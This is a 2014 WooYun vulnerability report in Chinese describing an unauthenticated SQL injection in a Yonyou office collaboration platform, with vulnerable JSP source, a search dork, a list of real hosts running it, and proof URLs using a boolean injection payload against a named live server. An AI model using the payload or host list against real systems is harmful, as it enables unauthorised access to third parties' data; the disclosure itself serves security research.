{"id": 52259, "wybug_id": "wooyun-2014-071842", "wybug_title": "用友某办公平台SQL通杀注入漏洞（无需登录）", "wybug_corp": "用友软件", "wybug_author": "路人甲", "wybug_date": "2014-08-11 15:11", "wybug_open_date": "2014-11-06 15:12", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-08-11：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-08-16：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-10-10：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-10-20：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-10-30：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-11-06：\t细节向公众公开  简要描述：  详细说明：  涉及客户群体为：大型企业（如：拉芳集团等等超大企业）、学校（北京师范）、医药、政府（如：珠海市人民防空办公室、广东省渔政总队珠海支队、广东煤炭地质局等等。。。）、能源（电网）、银行等等。。。通过关键字搜索如下：intitle:\"fe协作\"http://oa.bamatea.comhttp://oa.moonbasa.comhttp://oa.etonetech.comhttp://oa.ztcz.cnhttp://218.249.130.74http://119.146.190.170:9988http://zhidao.baidu.comhttp://wenku.baidu.comhttp://223.4.22.36http://222.243.160.83:9090http://www.chipshow.cnhttp://116.205.96.170:9090http://www.sxjbjt.com:9090http://122.225.203.168:8888http://oa.chinabed.comhttp://oa.lutongnet.comhttp://oa.zetacn.com:9090http://oa.zhcpt.edu.cnhttp://www.doc88.comhttp://oa.sinodata.com.cnhttp://www.docin.comhttp://www.koyochem.com:8080http://61.186.155.27http://oa.nyinn.cnhttp://115.236.65.115:9090http://119.146.190.118:8089http://219.137.250.133http://123.133.29.174:9090http://koa.ecp888.comhttp://www.cting.com.cnhttp://oa.suncorps.cnhttp://59.41.47.211http://oa.bamatea.com:9090http://oa.zhenaiws.comhttp://www.koyochem.com:9191http://60.208.131.46:9090http://219.131.221.174:9090http://oa.bnuz.edu.cn:8080http://183.238.59.61:9090http://218.205.208.22:9090http://oa.xhlbdc.comhttp://124.193.165.174:9090http://218.75.87.186:9090http://oa.eva-group.com:511http://113.106.92.16:9090http://oa.cqmsy.comhttp://cting.com.cnhttp://220.231.158.211http://oa.tiholding.cnhttp://124.172.170.141:9090http://oa.hengdigroup.com:9090http://www1.elkay.com.cn:9090http://www.gzpiano.comhttp://oa.zaffer.cnhttp://oa.gdisg.com分析witapprovemanage\\apprvaddNew.jsp\nDao dao = (Dao)ResourceManage.getContext(\"dao\");WitCollocate wit = (WitCollocate)ResourceManage.getContext(\"witCollocate\");DataTable table = wit.getModels();DataTable apps = wit.getAppResource();String flowid = \"\";FieldSet fs = null;String tablenameStr = \"\";if(request.getParameter(\"flowid\")!=null){flowid = request.getParameter(\"flowid\");//直接获取flowid变量fs= dao.getFieldSetByFilter(dao.getTableName(\"WF_MODEL\"),\" WM00= '\" + flowid + \"'\");//这里进入sql语句查询。。。产生sql注入漏洞tablenameStr = fs.getString(\"WM04\");}\n证明：http://www1.elkay.com.cn:9090/witapprovemanage/apprvaddNew.jsp?flowid=1' or '1'='1\n\nhttp://www1.elkay.com.cn:9090/witapprovemanage/apprvaddNew.jsp?flowid=1' or '1'='12\n\n\n\n   漏洞证明：  \n\n   修复方案：     版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-11-06 15:12 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}